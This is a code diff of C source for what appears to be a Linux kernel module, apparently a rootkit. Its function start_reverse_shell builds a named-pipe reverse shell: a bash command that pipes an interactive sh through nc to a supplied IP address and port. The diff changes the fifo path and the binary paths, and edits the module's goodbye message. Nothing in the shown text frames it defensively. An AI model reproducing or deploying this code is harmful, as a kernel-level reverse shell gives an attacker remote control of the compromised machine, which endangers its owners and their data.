@@ -26,7 +26,7 @@ void start_reverse_shell(char *ip, char *port) {
 	char *argv[] = {
 		"/bin/bash",
 		"-c",
-		"/usr/bin/rm /tmp/pinkit;/usr/bin/mkfifo /tmp/pinkit;/usr/bin/cat /tmp/pinkit|/bin/sh -i 2>&1|/usr/bin/nc $IP_ADDR $PORT_ADDR >/tmp/pinkit",
+		"/bin/rm /tmp/a;/usr/bin/mkfifo /tmp/a; /bin/cat /tmp/a | /bin/sh -i 2>&1 | /bin/nc $IP_ADDR $PORT_ADDR > /tmp/a",
 		NULL
 	};
 
@@ -43,7 +43,7 @@ static int __init start_module(void) {
 }
 
 static void __exit stop_module(void) {
-	printk(KERN_INFO "Goodbye world 1.\n");
+	printk(KERN_INFO "Goodbye world! test1\n");
 }
 
 module_init(start_module);
